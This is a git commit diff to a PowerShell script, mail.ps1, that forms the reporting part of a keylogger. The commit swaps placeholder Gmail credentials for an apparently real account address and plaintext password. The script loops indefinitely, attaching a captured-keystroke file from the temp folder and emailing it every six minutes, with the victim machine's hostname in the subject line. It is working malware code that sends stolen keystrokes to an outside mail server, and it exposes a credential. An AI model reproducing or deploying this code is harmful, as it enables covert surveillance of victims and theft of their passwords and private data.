f2a616f2ee54dbe5b3ea0063a4d52cc8848b885e
turuu <jiojutsumaster@gmail.com>
2020-06-13 10:25:47 +0800

    adds email

--- mail.ps1
+++ mail.ps1
@@ -2,9 +2,9 @@
 $SMTPServer = 'smtp.gmail.com'
 $SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587)
 $SMTPInfo.EnableSsl = $true
-$SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('youradress@gmail.com', 'yourpass')
+$SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('malchinhacker@gmail.com', 'malchinhacker123')
 $ReportEmail = New-Object System.Net.Mail.MailMessage
-$ReportEmail.From = 'youradress@gmail.com'
-$ReportEmail.To.Add('youradress@gmail.com')
+$ReportEmail.From = 'malchinhacker@gmail.com'
+$ReportEmail.To.Add('malchinhacker@gmail.com')
 $ReportEmail.Subject = 'Keylogger - ' + [System.Net.Dns]::GetHostByName(($env:computerName)).HostName
 while(1){$ReportEmail.Attachments.Add("$ENV:temp\key.txt");$SMTPInfo.Send($ReportEmail);sleep 360} 
